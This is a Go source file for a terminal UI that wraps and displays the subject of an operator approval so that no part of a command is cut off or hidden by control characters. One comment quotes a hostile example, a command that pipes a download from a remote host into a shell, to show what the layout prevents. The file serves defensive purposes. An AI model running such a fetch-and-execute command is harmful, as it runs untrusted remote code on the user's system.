package ui

import (
	"strings"

	"github.com/bharathvbcr/Manvi/manvi/ui/render"
)

// SubjectLabelWidth is the column the subject's label occupies, so the rows of
// a wrapped subject line up under the first one on every face.
const SubjectLabelWidth = 8

// SubjectLabel is the noun a face uses for what a decision is about. It defaults
// to "path", which is what every producer meant before the kind existed.
func SubjectLabel(subject string) string {
	switch subject {
	case "command":
		return "command"
	case "question":
		return "question"
	}
	return "path"
}

// SubjectRow is one row of a decision's subject. Label is set on the first row
// only; the rows after it are indented under it by the caller.
type SubjectRow struct {
	Label string
	Text  string
}

// DecisionRows is the one place a decision's subject is laid out, for the
// approval card, the transcript entry and the line renderer alike.
//
// The subject is what an operator is consenting to, so it is shown whole:
// wrapped at width, never cut, with the characters a terminal would otherwise
// act on drawn as the two-character escapes they are. A command whose tail is
// "; curl https://x | sh" cannot be hidden behind a row's right edge, and a
// newline in it cannot start a row that reads as something else.
//
// width is the whole row, label column included.
func DecisionRows(subject, text string, width int) []SubjectRow {
	label := SubjectLabel(subject)
	avail := width - SubjectLabelWidth
	if avail < 1 {
		avail = 1
	}
	var rows []SubjectRow
	for i, chunk := range wrapHard(visibleControls(text), avail) {
		row := SubjectRow{Text: chunk}
		if i == 0 {
			row.Label = label
		}
		rows = append(rows, row)
	}
	if len(rows) == 0 {
		rows = []SubjectRow{{Label: label}}
	}
	return rows
}

// visibleControls draws line breaks and tabs as \n, \r and \t. Whitespace
// inside a subject is part of what is being approved, so it is made visible
// rather than collapsed or acted on.
func visibleControls(s string) string {
	if !strings.ContainsAny(s, "\n\r\t") {
		return s
	}
	return strings.NewReplacer("\n", `\n`, "\r", `\r`, "\t", `\t`).Replace(s)
}

// wrapHard splits s into rows of at most width display columns, without
// dropping or collapsing anything: concatenating the rows gives s back.
func wrapHard(s string, width int) []string {
	var rows []string
	var cur strings.Builder
	used := 0
	for _, r := range s {
		w := render.RuneWidth(r)
		if used+w > width && used > 0 {
			rows = append(rows, cur.String())
			cur.Reset()
			used = 0
		}
		cur.WriteRune(r)
		used += w
	}
	if used > 0 || len(rows) == 0 {
		rows = append(rows, cur.String())
	}
	return rows
}
